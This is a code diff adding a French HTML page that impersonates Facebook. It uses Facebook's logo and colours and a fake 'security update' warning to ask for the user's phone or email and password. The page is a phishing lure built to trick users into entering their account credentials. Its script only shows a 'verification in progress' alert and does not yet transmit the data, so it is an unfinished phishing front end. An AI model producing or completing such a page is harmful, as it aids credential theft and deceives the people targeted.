@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sécurité Compte</title>
+    <style>
+        /* 1. LE STYLE (Le design) */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #121212; /* Fond très sombre */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-card {
+            background: #1e1e1e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 60px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        .update-message {
+            background-color: #2c2c2c;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #ffcc00; /* Jaune alerte */
+            margin-bottom: 25px;
+            border-left: 5px solid #ffcc00;
+            line-height: 1.4;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            background-color: #2a2a2a;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            background-color: #0866ff; /* Bleu Facebook */
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo" class="logo">
+        
+        <div class="update-message">
+            Nouvelle mise à jour : Veuillez sécuriser votre compte Facebook
+        </div>
+        
+        <form id="loginForm">
+            <input type="text" placeholder="Numéro de mobile ou e-mail" required>
+            <input type="password" placeholder="Mot de passe" required>
+            <button type="submit">Mettre à jour la sécurité</button>
+        </form>
+        
+    </div>
+
+    <script>
+        // 3. L'ACTION (Ce que fait le bouton)
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert("Vérification en cours...");
+        });
+    </script>
+
+</body>
+</html>
